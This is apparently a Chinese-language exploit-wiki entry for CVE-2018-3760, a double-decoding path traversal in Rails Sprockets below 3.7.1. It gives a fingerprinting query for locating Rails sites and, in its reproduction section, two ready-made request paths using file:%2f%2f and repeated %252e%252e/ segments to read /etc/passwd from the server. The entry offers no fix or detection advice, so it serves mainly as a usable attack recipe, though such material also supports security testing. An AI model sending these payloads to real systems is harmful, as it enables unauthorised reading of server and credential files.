# Rails sprockets 任意文件读取漏洞 CVE-2018-3760

## 漏洞描述

Ruby On Rails在开发环境下使用Sprockets作为静态文件服务器，Ruby On Rails是著名Ruby Web开发框架，Sprockets是编译及分发静态资源文件的Ruby库。

Sprockets 3.7.1及之前版本中，存在一处因为二次解码导致的路径穿越漏洞，攻击者可以利用%252e%252e/来跨越到根目录，读取或执行目标服务器上任意文件。

## 漏洞影响

<a-checkbox checked>Sprockets < 3.7.1</a-checkbox></br>

## 网络测绘

<a-checkbox checked>title="Ruby On Rails"</a-checkbox></br>

## 漏洞复现

主页面

![img](/assets/PeiQi-Wiki/img/1656041292346-1069b91e-aa5e-4d53-821a-9150720e9b5e.png)

先获取绝对路径

```php
/assets/file:%2f%2f/etc/passwd
```

![img](/assets/PeiQi-Wiki/img/1656041358544-854ca040-261f-474f-86fc-61a8558e4238.png)

再利用POC读取文件

```php
/assets/file:%2f%2f/usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd
```

![img](/assets/PeiQi-Wiki/img/1656041483857-17cdbe06-5526-4b80-9189-b4ec9ea0b834.png)